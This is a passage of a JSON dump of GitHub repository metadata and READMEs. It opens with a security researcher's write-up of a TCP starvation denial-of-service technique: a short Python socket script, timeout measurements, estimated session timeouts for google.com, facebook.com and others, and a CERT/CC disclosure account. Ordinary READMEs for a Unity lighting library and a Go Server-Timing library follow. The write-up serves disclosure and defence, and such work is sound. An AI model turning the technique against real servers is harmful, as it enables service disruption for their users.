response.\r\n\r\n    #/usr/bin/python\r\n    import socket\r\n    header = ('GET / HTTP/1.1\\r\\n'\r\n              'Host: www.google.com\\r\\n'\r\n              'Connection: keep-alive\\r\\n\\r\\n')\r\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    s.settimeout(5)\r\n    s.connect(('173.194.222.100', 80))\r\n    s.send(header)\r\n    s.close() \r\n\r\n![Starvation test on on google.com](https://raw.githubusercontent.com/Eplox/TCP-Starvation/master/images/google.png))\r\n<br>\r\n![TCP life cycle network flow](https://raw.githubusercontent.com/Eplox/TCP-Starvation/master/images/tcp_flow.png)\r\n\r\nBy adding a \"Connection: keep-alive\" to http/https request, increases the session hold time to at least the keep-alive time specified by the server. \r\n\r\nThe last packet from 173.194.222.100 is sent roughly 120 seconds after the attack occurred. \r\nIn most cases, the attack lasts equal to the time between first and last packet received, plus the time between last and second last packet. <br>\r\nThis is because the server may not send out a \"I'm done with you\" packet at the end of it's FIN_WAIT1 state., something that can be confirmed by monitoring netstat during the attack on the victim side.<br>\r\nSo for google.com, I would expect the total attack duration per request would be: (127-10)+(127-97) = 147 rounded up to 150 seconds.\r\n\r\n<br>\r\n\r\n## Test on a few different protocols\r\n    Protocol    Session Timeout     Software Version\r\n    HTTP        320                 Apache httpd 2.4.27 (Linux ubuntu 4.13.0-21-generic)\r\n    HTTPS       320                 Apache httpd 2.4.27 (Linux ubuntu 4.13.0-21-generic)\r\n    SSH         195                 OpenSSH 7.5p1 (Linux ubuntu 4.13.0-21-generic)\r\n    SMTP        310                 Postfix smtpd (Linux ubuntu 4.13.0-21-generic)\r\n\r\nTimeout values seem to depend on the application itself, as well as the kernel values such as  https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt<br>\r\nResult may variate between different protocols, kernels and settings.\r\n\r\n<br>\r\n\r\n## Estimated TCP session timeout on a few popular sites\r\ngoogle.com: 150sec<br>\r\nfacebook.com: 200sec<br>\r\nwikipedia.org: 90sec<br>\r\ntwitter.com: 1020sec<br>\r\nreddit.com: 710sec\r\n\r\n<br>\r\n\r\n## And if you weaponize it?\r\nhttps://www.youtube.com/watch?v=6rE0hMq6_gQ<br>\r\n[![Youtube](https://img.youtube.com/vi/6rE0hMq6_gQ/0.jpg)](https://www.youtube.com/watch?v=6rE0hMq6_gQ)\r\n\r\n<br>\r\n\r\n## Disclosure\r\nThis vulnerability has been a real nightmare to disclose responsible. It could take several months before getting a reply with \"TCP vulnerabilities are not within our scope.\", or just no answers at all.\r\nAfter multiple of disclosing attempts, I finally got in contact with EFF https://www.eff.org/security which pointed me in the right direction of CERT Coordination Center (CERT/CC) https://www.cert.org/, where the case was quickly handled with:\r\n\r\nAfter analysis, we believe we have determined that this attack is a variant of a NAPTHA attack, CVE-2000-1039. We previously published an advisory on these types of attacks: <https://www.cert.org/historical/advisories/CA-2000-21.cfm> and a longer research report is available at <https://www.giac.org/paper/gsec/313/naptha-type-denial-of-service-attack/100899>.\r\n<br><br>We're looking at updating the advisory to specify TCP RST packets too, but the problem in general appears to be a publicly known one. It's also unclear how the RFC could be updated to prevent this sort of attack in TCP.\r\n\r\n<br>\r\n\r\n## Q/A\r\n**Q:** How do I defend myself?<br>\r\n**A:** Defending yourself means you have to tweak the timeout and retransmission settings, this could affect users with poor connections in a negative way.<br>\r\n\r\n**Q:** Will you release kittenzlauncher from that youtube video?<br>\r\n**A:** Not planning to do so. Giving script kiddies a newb friendly attack tool with a ton of evasion and attack functionality would probably piss off more people than make others happy.\r\n","byteSize":6316},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":291},"createdAt":"2018-02-12T08:33:21Z","updatedAt":"2018-02-17T06:30:35Z","pushedAt":"2018-02-14T22:27:51Z","description":null,"subscribersCount":{"totalCount":20},"diskUsage":635,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":2},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":5}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"raphael-ernaelsten","followers":{"totalCount":20},"repositories":{"totalCount":2},"following":{"totalCount":0},"location":"Belgium","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"Aura","primaryLanguage":{"name":"C#"},"license":"Other","isArchived":false,"hasWikiEnabled":true,"forkCount":22,"readme_md":{"text":"\n![Aura - Volumetric Lighting for Unity](https://i.imgur.com/VDDo0aX.png)\n\n## Aura - Volumetric Lighting for Unity\n\n----------\n\n#### PLEASE READ THIS DOCUMENT BEFORE DOWNLOADING AURA\n##### An extended version of this document can be found as the \"Starting Guide.pdf\".\n\n----------\n## About Aura\n\n**TL;DR;**\n\nWhat Aura is :\n - a local simulation of the light scattering into the surrounding medium\n \nWhat Aura is not:\n - an atmospheric scattering simulation\n - a cloud simulator\n\nAura is an open source volumetric lighting solution for Unity. \nThe development is hosted on GitHub and the latest package is published on the Asset Store.\n\nAura simulates the scattering of the light in the environmental medium and the illumination of micro-particles that are present in this environment but invisible to the eye/camera.\nThis effect is also called “volumetric fog”.\n\n![The directional light is scattered into the air and illuminates the invisible micro-particles. ](https://i.imgur.com/fW02LXF.png)\n\nAura uses a globalist approach that makes every lights and injection volumes interconnected. This means that when you locally modify the environment somewhere, it will automatically affect all the lights and injection volumes. No boring and redundant per-instance setup ...\n\nAlso, all lights and injection volumes are dynamic and then, can be created, modified or destroyed at runtime.\n\nAura packs a bunch of features such as full lighting support, injection volumes and particles illumination.\n\n[Click here to view the recap of all the features of Aura (on YouTube).\n![Click here to view the recap of all the features of Aura (on YouTube)](http://img.youtube.com/vi/PCrc2cWDX1E/0.jpg)](http://www.youtube.com/watch?v=PCrc2cWDX1E \"\")\n\n----------\n## Overview\n\nAura relies on Bart Wronski ([@BartWronsk](http://twitter.com/BartWronsk))’s [Presentation](https://bartwronski.files.wordpress.com/2014/08/bwronski_volumetric_fog_siggraph2014.pdf) and particularly the idea that the volumetric lighting could be solely computed in the frustum and pre-integrated in a 3D texture.\n\nStarting from that, 7 additional points were targeted :\n - Dynamic quality *(not fixed ones)*\n - Ease of use *(not hours of integration or many parameters to struggle with)*\n - Make it cascaded *(for further range) -> Not implemented yet but bases are set*\n - Use Unity’s full lighting system *(not only one directional light)*\n - Use injection volumes *(locally modify the density, lighting and scattering)*\n - Illuminate Unity’s particles *(to have macro and micro particles volumetric lighting)*\n - Plug other processes *(so we could have volumetric GI, custom smoke, …)*\n\nHere’s the schematic overview of Aura’s internal process :\n![Schematic overview of Aura's internal process](https://i.imgur.com/bJjtP7f.png)\n\n[Click here to visit the online API Documentation.](http://www.raphick.be/aura/documentation/)\n\n**Please note that Aura is meant to be an evolving project. Importing updates might require re-tweaking, re-assigning Aura components or deleting the asset’s folder prior importing.**\n\n----------\n## Requirements \n\nAura **strictly** requires full support of the following elements to work :\n- RenderTextures (3D as well)\n- Texture2DArrays\n- ComputeShaders\n\nAura release was targeted for Unity 2017.2 :\n - older version will not be supported (although I can help making it work ;-) )\n - newer version will be supported with updates if necessary, but, Aura still remains a side project so there will never be any promised ETA \n\nPlease verify that the support of these elements is not limited especially on lower platforms.\n\t\nAura was developed and tested on Windows and DirectX11.\nAlthough there should be not definitive or critical reason that it wouldn't work, no other platform/graphic API is currently garanteed.\n\nHistorically, Texture2DArrays were introduced in Unity 5.4 which makes it the lowest version compatible with Aura.\n\nHowever, multi-threaded ComputeShaders compilation was introduced in Unity 2017.2 which makes it the advised minimum version.\n\n**The main ComputeShader has many variants (for performance purposes). This will lead its compilation, and therefore the import of the package in Unity, to take a long time (usually from 20 minutes to an hour!). \nPLEASE DO NOT KILL UNITY AND WAIT UNTIL THE IMPORT IS DONE.\nIf you did kill Unity, or experienced any trouble, during importation, you'll get a \"NullReference Exception\", re-import the file Aura/Shaders/ComputeShaders/ComputeDataComputeShader.compute**\n\nAlso, please also understand that you might need a Technical Artist or a Graphics Programmer if you want to make Aura fit some special requirements. \n\n----------\n## Acknowledgement\n\nAura uses the following works :\n - [Bartlomiej Wronski (@BartWronsk)](http://twitter.com/BartWronsk)’s presentation : [“Volumetric Fog : Unified compute shader based solution to atmospheric scattering”](https://bartwronski.files.wordpress.com/2014/08/bwronski_volumetric_fog_siggraph2014.pdf)\n - [Sebastien Hillaire (@SebHillaire)](http://twitter.com/SebHillaire)’s integration formula : [“Physically Based and Unified Volumetric Rendering in Frostbite”](https://www.slideshare.net/DICEStudio/physically-based-and-unified-volumetric-rendering-in-frostbite/26)\n - Ashima Arts’s 4D Simplex Noise : [https://github.com/ashima/webgl-noise](https://github.com/ashima/webgl-noise)\n\nAbout the provided demo scene :\n - Marko Dabrovic’s Sponza scene : [http://hdri.cgtechniques.com/~sponza/files/](http://hdri.cgtechniques.com/~sponza/files/)\n - Unity Lab’s smoke spritesheet : [“VFX Image Sequences & Flipbooks”](https://labs.unity.com/article/free-vfx-image-sequences-flipbooks)\n\nPlease let me know if I forgot any reference.\n\n----------\n## Special Thanks\n\nFor their time and help, I would like to cheerfully thank :\n - [Bartlomiej Wronski (@BartWronsk)](https://twitter.com/BartWronsk)\n - [Florent Guinier (@FlorentGuinier)](https://twitter.com/FlorentGuinier)\n - [Sebastien Lagarde (@SebLagarde)](https://twitter.com/SebLagarde)\n - [Gil Damoiseaux (@Gaxil)](https://twitter.com/Gaxil)\n - All the people that helped me by testing Aura, and kept me motivated with their constructive feedbacks and their kind words.\n\n----------\n## License\n\nAura is released under MIT License.\nPlease refer to the license.txt file located in the Aura/License folder for the full license.\n\n**TL;DR;**\n - You can sell and make money with your projects that use Aura (or any derived form)\n - You can do whatever you want with Aura but not sell Aura (or any derived form)\n - You must propagate this license\n - There is no warranty of any kind\n - Please consider crediting Aura (or any derived form) in your projects, with the provided logo if relevant\n\n----------\n## FAQ\n\n### Why releasing Aura for free?\nFor several reasons :\n - Aura was actually never meant to be sold. It was a personal challenge I set to myself. When people asked me about its price, I was just answering that such a solution would be worth around 40$.\n - I am a self learner. Half of the knowledge I have is from dissecting sources from people that shared them. I wanted to give this opportunity back to the community. As a Teacher I really feel like this is a good deed.\n - I just want to make the Unity community thrive and make Unity better on my own level.\n\n### Can we make donations?\nI didn’t expect that, thank you!\nYou can click on the following button for making a donation via Paypal.\n\n[![You can click on the following button for making a donation via Paypal.](https://www.paypalobjects.com/en_US/GB/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=RFCCD4V4LLQ6U \"\")\n\n### Will Aura’s development be continued?\nHopefully yes! At least until Unity drops the legacy lighting system. Furthermore, I still have a bunch of feature ideas to implement, fixes and todos.\n\n### Will Aura support the Scriptable Render Pipeline?\nAnyhow, all this work cannot stop with the end of the legacy pipeline. So yes, my plan is to make it work with the SRP for the long term continuation. It may however be part of another branch/repository.\n\n### Does Aura work on Unity xxx?\nThe technical requirement for Aura are specified in the Requirements section.\nThe minimum version possible for Aura is Unity 5.4 but the release is targeted for 2017.2.\n\n### Does Aura support VR?\nI did not test it myself but apparently Aura works out-of-hands with multi-view VR.\nSingle-pass doesn't work for now but is under investigation.\n\n### Why did it take so long?\nAura was a personal project, a challenge for myself. It was developed during my free time. \nI am a full-time Technical Art Teacher and aside, we released our game (Outcast Second Contact) a few months ago. This, combined with my family life gives a pretty good idea of the amount of time I was able to manage for Aura.\n\n### How can we help you developing Aura?\nThere are many ways you can help me facilitating the development of Aura :\n - You can spread the words about Aura.\n - You can branch the repo, improve the code, develop new features, fix bugs, ... \nI’ll merge with the Master if relevant.\n - You can share your work made with Aura or tips using Aura.\n - You can make a demo scene and send it to me. (Make sure to own the content of it so I can publish it in the package)\n - You can make a donation, like previously said.\n - Anything that can help making Aura a great project!\n\n### How can I keep updated about Aura?\nTwo sure possibilities :\n - [Follow me on Twitter (@RaphErnaelsten)](https://twitter.com/RaphErnaelsten)\n - Wait for the updates of the package on the Asset Store.\n\n----------\n## Contact\n\n[Feel free to contact me : @RaphErnaelsten](https://twitter.com/RaphErnaelsten)\n\n![View Counter](https://s01.flagcounter.com/mini/sfjh/bg_FFFFFF/txt_000000/border_FFFFFF/flags_0/)\n","byteSize":9855},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":384},"createdAt":"2018-02-12T14:47:07Z","updatedAt":"2018-02-17T01:03:19Z","pushedAt":"2018-02-16T11:52:51Z","description":"Volumetric Lighting for Unity","subscribersCount":{"totalCount":36},"diskUsage":153215,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":5},"issuesClosed":{"totalCount":4},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":4}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"mitchellh","followers":{"totalCount":5577},"repositories":{"totalCount":112},"following":{"totalCount":0},"location":"Los Angeles, CA","organizations":{"totalCount":2},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":18},"stargazers":{"totalCount":41}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":3},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":23}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":9}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":82},"websiteUrl":"http://mitchellh.com"},"repository":{"name":"go-server-timing","primaryLanguage":{"name":"Go"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":11,"readme_md":{"text":"# HTTP Server-Timing for Go\n[![Godoc](https://godoc.org/github.com/mitchellh/go-server-timing?status.svg)](https://godoc.org/github.com/mitchellh/go-server-timing)\n\nThis is a library including middleware for using\n[HTTP Server-Timing](https://www.w3.org/TR/server-timing) with Go. This header\nallows a server to send timing information from the backend, such as database\naccess time, file reads, etc. The timing information can be then be inspected\nin the standard browser developer tools:\n\n![Server Timing Example](https://raw.githubusercontent.com/mitchellh/go-server-timing/master/example/screenshot.png)\n\n## Features\n\n  * Middleware for injecting the server timing struct into the request `Context`\n    and writing the `Server-Timing` header.\n\n  * Concurrency-safe structures for easily recording timings of multiple\n    concurrency tasks.\n\n  * Parse `Server-Timing` headers as a client.\n\n  * Note: No browser properly supports sending the Server-Timing header as\n    an [HTTP Trailer](https://tools.ietf.org/html/rfc7230#section-4.4) so\n\tthe Middleware only supports a normal header currently.\n\n## Browser Support\n\nBrowser support is required to **view** server timings easily. Because server\ntimings are sent as an HTTP header, there is no negative impact to sending\nthe header to unsupported browsers.\n\n  * **Chrome 65 or higher** is required to properly display server timings\n    in the devtools.\n\n  * **Firefox is pending** with an [open bug report (ID 1403051)](https://bugzilla.mozilla.org/show_bug.cgi?id=1403051)\n\n  * IE, Opera, and others are unknown at this time.\n\n## Usage\n\nExample usage is shown below. A fully runnable example is available in\nthe `example/` directory.\n\n```go\nfunc main() {\n\t// Our handler. In a real application this might be your root router,\n\t// or some subset of your router. Wrapping this ensures that all routes\n\t// handled by this handler have access to the server timing header struct.\n\tvar h http.Handler = http.HandlerFunc(handler)\n\n\t// Wrap our handler with the server timing middleware\n\th = servertiming.Middleware(h, nil)\n\n\t// Start!\n\thttp.ListenAndServe(\":8080\", h)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\t// Get our timing header builder from the context\n\ttiming := servertiming.FromContext(r.Context())\n\n\t// Imagine your handler performs some tasks in a goroutine, such as\n\t// accessing some remote service. timing is concurrency safe so we can\n\t// record how long that takes. Let's simulate making 5 concurrent requests\n\t// to various servicse.\n\tvar wg sync.WaitGroup\n\tfor i := 0; i < 5; i++ {\n\t\twg.Add(1)\n\t\tname := fmt.Sprintf(\"service-%d\", i)\n\t\tgo func(name string) {\n\t\t\t// This creats a new metric and starts the timer. The Stop is\n\t\t\t// deferred so when the function exits it'll record the duration.\n\t\t\tdefer timing.NewMetric(name).Start().Stop()\n\t\t\ttime.Sleep(random(25, 75))\n\t\t\twg.Done()\n\t\t}(name)\n\t}\n\n\t// Imagine this is just some blocking code in your main handler such\n\t// as a SQL query. Let's record that.\n\tm := timing.NewMetric(\"sql\").WithDesc(\"SQL query\").Start()\n\ttime.Sleep(random(20, 50))\n\tm.Stop()\n\n\t// Wait for the goroutine to end\n\twg.Wait()\n\n\t// You could continue recording more metrics, but let's just return now\n\tw.WriteHeader(200)\n\tw.Write([]byte(\"Done. Check your browser inspector timing details.\"))\n}\n\nfunc random(min, max int) time.Duration {\n\treturn (time.Duration(rand.Intn(max-min) + min)) * time.Millisecond\n}\n```\n","byteSize":3417},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":521},"createdAt":"2018-02-12T03:56:02Z","updatedAt":"2018-02-17T07:59:50Z","pushedAt":"2018-02-15T23:45:30Z","description":"Go (golang) library for creating and consuming HTTP Server-Timing headers","subscribersCount":{"totalCount":15},"diskUsage":100,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":5},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":29}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"RuqayaAlhemeiri","followers":{"totalCount":14},"repositories":{"totalCount":1},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":null},"repository":{"name":"H.w","primaryLanguage":null,"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":0,"readme_md":{"text":"# H.w","byteSize":5},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":115},"createdAt":"2018-02-11T17:56:02Z","updatedAt":"2018-02-15T10:24:03Z","pushedAt":"2018-02-11T17:58:00Z","description":null,"subscribersCount":{"totalCount":26},"diskUsage":12,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":2}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"komeiji-satori","followers":{"totalCount":113},"repositories":{"totalCount":35},"following":{"totalCount":136},"location":"127.0.0.1","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}}],"totalCount":1},"websiteUrl":"https://satori.moe"},"repository":{"name":"Dress","primaryLanguage":null,"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":15,"readme_md":{"text":"# Dress\n#### 好耶 是女装\n","byteSize":30},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":129},"createdAt":"2018-02-11T03:49:29Z","updatedAt":"2018-02-17T05:11:19Z","pushedAt":"2018-02-16T13:51:15Z","description":"好耶  是女装","subscribersCount":{"totalCount":29},"diskUsage":2799,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":5},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":4},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":19}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"threepointone","followers":{"totalCount":874},"repositories":{"totalCount":148},"following":{"totalCount":0},"location":"Bangalore, India","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":13},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":20}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{